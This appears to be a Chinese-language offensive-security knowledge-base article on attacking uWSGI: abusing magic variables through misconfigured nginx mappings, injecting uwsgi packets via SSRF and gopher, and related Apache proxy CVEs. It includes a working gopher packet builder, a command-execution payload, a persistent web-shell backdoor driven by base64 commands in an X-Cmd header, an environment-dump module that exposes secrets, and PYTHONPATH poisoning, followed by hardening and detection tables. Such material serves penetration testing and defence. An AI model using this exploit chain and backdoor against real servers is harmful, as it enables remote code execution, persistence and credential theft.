---
status: NEEDS_HUMAN_REVIEW
degradation_reason: |
  5 个资源中 2 个降解（40%）。P1-02 uWSGI Security RTD 页面返回
  "Documentation page not found"（curl → 404, 代理 exit 7）。
  P2-01 bugculture.io CTF writeup 为纯 CSS SPA（curl → 代理 exit 7 →
  Playwright 未安装）。内容通过 Hacktricks 二手源保留。
verified_resources: |
  P1: uwsgi-docs Vars（78 技术标记）、Protocol（58 标记）、Changelog（2.0.26 真实内容）
  CrossRefs: werkzeug.md（176L）READ → LINK_ONLY、SSRF README.md（496L）READ → LINK_ONLY
  SectionMapping: 13/13 VERIFIED, 0 MISSING

attack_surface:
  - 配置缺陷
  - 注入类
  - 协议解析差异
impact:
  - 远程代码执行
  - 信息泄露
  - 权限提升
risk_level: 高
prerequisites:
  - Python WSGI 应用架构
  - uWSGI 协议基础
  - nginx/Apache 反向代理配置
  - SSRF 利用技术
related_techniques:
  - ssrf
  - werkzeug-debug-rce
  - http-request-smuggling
  - file-upload
  - credential-harvesting
difficulty: 高级
tools:
  - curl
  - python3
  - gopher
---

# uWSGI & WSGI — uWSGI Post-Exploitation & Protocol Attacks — uWSGI 后渗透与协议攻击

> 关联文档：[Werkzeug Debug RCE](../werkzeug/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) · [File Upload](../../Files/File%20Upload/README.md) · [Nginx](../Nginx/README.md)

---

### 知识路径

```
uWSGI & WSGI（本文档）
  ├── 前置知识：Python WSGI — PEP 3333、application(environ, start_response)
  ├── 前置知识：uWSGI 架构 — emperor 模式、worker、uwsgi 协议
  ├── 进阶：通过错误配置的 nginx uwsgi_param 利用 uWSGI Magic Variables
  ├── 进阶：SSRF + gopher → uwsgi 协议 → UWSGI_FILE RCE
  ├── 关联：Werkzeug / Flask Debug Console RCE
  │   └── 参见：Web Servers & Middleware/werkzeug
  ├── 关联：SSRF — gopher 协议滥用
  │   └── 参见：User input/Reflected Values/SSRF
  ├── 关联：HTTP Request Smuggling — CVE-2023-27522 mod_proxy_uwsgi
  │   └── 参见：Proxies/HTTP Request Smuggling
  └── 关联：File Upload → 写入 Python 文件 → UWSGI_FILE 加载
      └── 参见：Files/File Upload
```

---

# 0x01 WSGI 与 uWSGI — 架构与攻击面

## 1.1 WSGI 概览

Web Server Gateway Interface（WSGI）是一个规范（PEP 3333），描述了 Web 服务器如何与 Python Web 应用通信。服务器为每个请求调用 `application(environ, start_response)` 可调用对象。

**uWSGI** 是最流行的 WSGI 服务器之一。其原生二进制传输协议是 **uwsgi 协议**（小写），它从反向代理向后端应用服务器传递一组键/值参数（"uwsgi params"）。这些参数**不是** HTTP 头部 — 它们存在于 uwsgi 协议层，与客户端 HTTP 之间存在一跳的距离。

**关键架构点：**

| 组件 | 角色 | 攻击面 |
|------|------|--------|
| 反向代理（nginx/Apache） | 将 HTTP 转换为 uwsgi params | `uwsgi_param` 将用户输入错误映射到 Magic Variables |
| uWSGI Server | 加载并运行 Python WSGI 应用 | Magic Variables 控制应用加载、环境、路径 |
| uwsgi Protocol Socket | 承载二进制参数包的 TCP/Unix Socket | 如果绑定到 TCP，可通过 SSRF + gopher 直接访问 |
| Python WSGI Application | `application(environ, start_response)` 可调用对象 | 可通过 `UWSGI_FILE` 替换实现后门 |

## 1.2 攻击面分类

| 类别 | 分类名称 | 技术 |
|------|---------|------|
| 配置缺陷 | 配置缺陷 | `uwsgi_param UWSGI_FILE $arg_f` — 用户控制的查询参数映射到 Magic Variables；`UWSGI_SETENV` 覆盖安全设置 |
| 注入类 | 注入类 | SSRF + gopher → uwsgi 二进制包注入 → `UWSGI_FILE` RCE；`UWSGI_MODULE` + `UWSGI_CALLABLE` 动态模块加载 |
| 协议解析差异 | 协议解析差异 | CVE-2023-27522：使用 `mod_proxy_uwsgi` 时，构造的源响应头导致 HTTP 响应走私；CVE-2024-24795：httpd 模块中的响应分割 |
| 信息泄露 | 信息泄露 | 通过 `UWSGI_FILE` 加载间谍模块转储环境变量；`UWSGI_CHDIR` + 文件服务辅助模块 |

---

# 0x02 uWSGI Magic Variables 利用

## 2.1 机制

uWSGI 的 "Magic Variables" 是控制实例如何加载和分发应用的 uwsgi 协议参数。它们**不是 HTTP 头部** — 它们在从反向代理到 uWSGI 后端的 uwsgi/SCGI/FastCGI 请求二进制 payload 中传输。如果代理配置将**用户控制的数据**映射到 uwsgi 参数（通过 `$arg_*`、`$http_*` 或不安全暴露的 uwsgi 协议端点），攻击者可以设置这些变量并实现代码执行。

## 2.2 危险的 nginx 代理映射

类似以下的错误配置直接将 uWSGI Magic Variables 暴露给用户输入：

```
location /app/ {
  include uwsgi_params;
  # 危险：将查询参数映射到 uwsgi params
  uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
  uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
  uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
  uwsgi_pass unix:/run/uwsgi/app.sock;
}
```

> **链式攻击：** 如果应用或上传功能允许在可预测路径下写入文件，结合以上映射，当后端加载攻击者控制的文件/模块时，将导致**即时 RCE**。

## 2.3 关键可利用变量

### 2.3.1 `UWSGI_FILE` — 任意文件加载/执行

```
uwsgi_param UWSGI_FILE /path/to/python/file.py;
```

加载并执行任意 Python 文件作为 WSGI 应用。如果攻击者通过 uwsgi param 包控制此参数，即可实现远程代码执行（RCE）。

### 2.3.2 `UWSGI_SCRIPT` — 脚本加载

```
uwsgi_param UWSGI_SCRIPT module.path:callable;
uwsgi_param SCRIPT_NAME /endpoint;
```

加载指定脚本作为新应用。结合文件上传或写入能力，可导致 RCE。

### 2.3.3 `UWSGI_MODULE` 与 `UWSGI_CALLABLE` — 动态模块加载

```
uwsgi_param UWSGI_MODULE malicious.module;
uwsgi_param UWSGI_CALLABLE evil_function;
uwsgi_param SCRIPT_NAME /backdoor;
```

加载任意 Python 模块并调用其中的特定函数。`SCRIPT_NAME` 参数定义恶意应用挂载的 URL 路径。

### 2.3.4 `UWSGI_SETENV` — 环境变量操控

```
uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
```

修改环境变量，可能影响应用行为或加载恶意配置。可覆盖 Django、Flask 或其他框架中的安全关键设置。

### 2.3.5 `UWSGI_PYHOME` — Python 环境操控

```
uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
```

更改 Python 虚拟环境，可能加载恶意包或完全不同的 Python 解释器。

### 2.3.6 `UWSGI_CHDIR` — 目录切换

```
uwsgi_param UWSGI_CHDIR /etc/;
```

在处理请求前更改工作目录。可与其他特性（文件读取原语、路径遍历）结合以访问敏感文件。

---

# 0x03 SSRF + uwsgi 协议 Gopher 跳板

## 3.1 威胁模型

如果目标 Web 应用暴露了 SSRF 原语，且 uWSGI 实例监听在内部 TCP Socket 上（如 `socket = 127.0.0.1:3031`），攻击者可以通过 **gopher** 协议发送原始 uwsgi 协议数据并注入 uWSGI Magic Variables。

这之所以可行，是因为部署通常内部使用非 HTTP 的 uwsgi Socket — 反向代理（nginx/Apache）将客户端 HTTP 转换为 uwsgi param 包。通过 SSRF + gopher，可以直接构造 uwsgi 二进制包并设置 `UWSGI_FILE` 等危险变量。

## 3.2 uwsgi 协议结构

- **Header（4 字节）：**`modifier1`（1 字节）、`datasize`（2 字节，小端序）、`modifier2`（1 字节）
- **Body：** 序列 `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`

标准请求的 `modifier1` 为 0。Body 包含 `SERVER_PROTOCOL`、`REQUEST_METHOD`、`PATH_INFO`、`UWSGI_FILE` 等 uwsgi params。

## 3.3 Gopher 包构造器

```python
import struct, urllib.parse

def uwsgi_gopher_url(host, port, params):
    body = b''.join([struct.pack('<H', len(k))+k.encode()+struct.pack('<H', len(v))+v.encode() for k,v in params.items()])
    pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
    return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)

# 示例 URL：
gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
```

**用法 — 强制加载先前写入服务器的文件：**

```python
params = {
  'SERVER_PROTOCOL':'HTTP/1.1', 'REQUEST_METHOD':'GET', 'PATH_INFO':'/',
  'UWSGI_FILE':'/app/profiles/malicious.py', 'SCRIPT_NAME':'/malicious.py'
}
print(uwsgi_gopher_url('127.0.0.1', 3031, params))
```

通过 SSRF 发送生成的 URL。

## 3.4 完整示例

如果能在磁盘上写入 Python 文件（扩展名不重要）：

```python
# /app/profiles/malicious.py
import os
os.system('/readflag > /app/profiles/result.txt')

def application(environ, start_response):
    start_response('200 OK', [('Content-Type','text/plain')])
    return [b'ok']
```

生成并触发将 `UWSGI_FILE` 设置为此路径的 gopher payload。后端将其作为 WSGI 应用导入并执行。通过正常的 HTTP 接口读取结果。

---

# 0x04 后渗透技术

## 4.1 持久化后门

### 4.1.1 基于文件的后门

```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
    cmd = environ.get('HTTP_X_CMD', '')
    if cmd:
        result = subprocess.run(base64.b64decode(cmd), shell=True, capture_output=True, text=True)
        response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
    else:
        response = 'Backdoor active'
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return [response.encode()]
```

通过 `UWSGI_FILE` 加载，在指定的 `SCRIPT_NAME` 下访问。后门通过 `X-Cmd` HTTP 头接收 Base64 编码的命令。

### 4.1.2 基于环境的持久化

```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```

通过污染 `PYTHONPATH` 在合法 site-packages 之前包含可写目录，攻击者用恶意版本遮蔽标准库模块。

## 4.2 信息泄露

### 4.2.1 环境变量转储

```python
# env_dump.py
import os, json

def application(environ, start_response):
    env_data = {'os_environ': dict(os.environ), 'wsgi_environ': dict(environ)}
    start_response('200 OK', [('Content-Type', 'application/json')])
    return [json.dumps(env_data, indent=2).encode()]
```

通过 `UWSGI_FILE` 加载以转储所有系统环境变量和 WSGI environ 字典。通常会暴露数据库 URL、API 密钥、Secret Key 和内部服务地址。

### 4.2.2 文件系统访问

结合 `UWSGI_CHDIR` 与文件服务辅助模块浏览敏感目录：

```
uwsgi_param UWSGI_CHDIR /etc/;
uwsgi_param UWSGI_FILE /tmp/dir_list.py;
```

## 4.3 提权思路

- 如果 uWSGI 以高权限运行且写入的 Socket/PID 归 root 所有，滥用环境和目录变更可能帮助以高权限所有者放置文件或操控运行时状态。
- 通过 `UWSGI_FILE` 加载的文件内部的 environment（`UWSGI_*`）覆盖配置，可影响进程模型和工作进程，使持久化更加隐蔽。

```python
# malicious_config.py
import os

# 覆盖 uWSGI 配置
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```

---

# 0x05 反向代理去同步（uWSGI 链路）

## 5.1 CVE-2023-27522 — mod_proxy_uwsgi 响应走私

使用 `mod_proxy_uwsgi` 的 Apache httpd 2.4.30–2.4.55：构造的源响应头可导致 HTTP 响应走私。后端的响应头在通过 `mod_proxy_uwsgi` 的 uwsgi→HTTP 转换层时未经过适当验证，允许注入的 `\r\n` 序列提前终止 HTTP 响应并注入第二个响应。

- **受影响：** Apache httpd 2.4.30–2.4.55 + `mod_proxy_uwsgi`
- **修复：** 升级 Apache 至 ≥2.4.56
- **uWSGI 侧：** uWSGI 2.0.22 / 2.0.26 调整了 Apache 集成行为

## 5.2 CVE-2024-24795 — 多个 httpd 模块中的响应分割

在 Apache httpd 2.4.59 中修复；uWSGI 2.0.26 相应调整了 Apache 集成。uWSGI 2.0.26 更新日志注明："let httpd handle CL/TE for non-http handlers."

多个 httpd 模块（包括 `mod_proxy_uwsgi`）在后端注入了包含非法字符的头部时存在 HTTP 响应分割漏洞。修复确保在 httpd 层进行适当的头部清理，不受后端协议影响。

## 5.3 利用上下文

这些 CVE **不能**直接授予 uWSGI 的 RCE，但在边缘情况中可与头部注入或 SSRF 链接以转向 uwsgi 后端。测试时：

- 指纹识别代理和版本
- 将去同步/走私原语视为进入仅后端路由和 uwsgi Socket 的入口向量
- 攻击链：去同步 → 到达内部 uwsgi 端口 → gopher → `UWSGI_FILE` RCE

---

# 0x06 防御、加固与工具

## 6.1 加固检查表

| 措施 | 理由 |
|------|------|
| 绝不将 `$arg_*` 或 `$http_*` 映射到 uwsgi Magic Variables（`UWSGI_FILE`、`UWSGI_MODULE` 等） | 防止用户控制的 Magic Variable 注入 |
| 将 uwsgi Socket 绑定到 Unix Domain Socket（`unix:/run/uwsgi/app.sock`）而非 TCP `127.0.0.1:3031` | Unix Socket 无法通过 SSRF/gopher 访问 |
| 如果必须使用 TCP，仅绑定到 `127.0.0.1` 并对端口进行防火墙限制 | 限制 SSRF 跳板面 |
| 在 nginx 中设置 `uwsgi_param` 白名单 — 仅传递已知安全的参数 | 纵深防御注入攻击 |
| 默认关闭 uWSGI 的 `--honour-stdin`；不将 uwsgi 协议暴露给不可信网络 | 防止直接协议注入 |
| 以非特权用户（非 root）运行 uWSGI；在配置中使用 `uid` 和 `gid` | 限制 RCE 影响范围 |
| 禁用 uWSGI `emperor` 模式或限制其控制 Socket 权限 | 防止攻击者生成新 vassal |
| 保持 Apache httpd ≥2.4.59 和 uWSGI ≥2.0.26 | 缓解 CVE-2023-27522 和 CVE-2024-24795 |
| 清理和验证所有 `UWSGI_SETENV` 值；绝不允许用户控制的环境覆盖 | 防止 Python 路径和设置污染 |
| 监控 uwsgi Socket 上的异常二进制流量（uwsgi 端口上的非 HTTP 模式） | 检测 gopher/SSRF 跳板尝试 |

## 6.2 检测指标

| 指标 | 意义 |
|------|------|
| 非标准端口或 HTTP 暴露端口上的 uwsgi 协议包 | SSRF + gopher 跳板尝试 |
| uWSGI 进程从 `/tmp`、`/var/tmp`、上传目录加载 Python 文件 | `UWSGI_FILE` 后门加载 |
| `UWSGI_SETENV` 修改 `PYTHONPATH`、`DJANGO_SETTINGS_MODULE` 或 `PATH` | 环境污染 |
| nginx 错误日志显示包含可疑值（路径、分号、换行符）的 `uwsgi_param` | Magic Variable 注入尝试 |
| 在不寻常的 `SCRIPT_NAME` 路径下注册的新 WSGI 应用 | 后门部署 |

## 6.3 工具

| 工具 | 用途 |
|------|------|
| `curl` + `--header` | HTTP 层 Magic Variable 探测 |
| Python `struct` + `urllib.parse` | uwsgi gopher 包构造 |
| Gopher SSRF 客户端 | 协议跳板到内部 uwsgi Socket |
| Werkzeug Debug RCE 工具 | Flask/Werkzeug Console 利用 |

## 参考资料

- [uWSGI Magic Variables 文档](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [uWSGI 安全最佳实践](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [uwsgi 协议规范](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
- [uWSGI 2.0.26 更新日志 — CVE-2024-24795 调整](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)
- [bugculture.io — IOI SaveData CTF Writeup（uWSGI 利用）](https://bugculture.io/writeups/web/ioi-savedata)
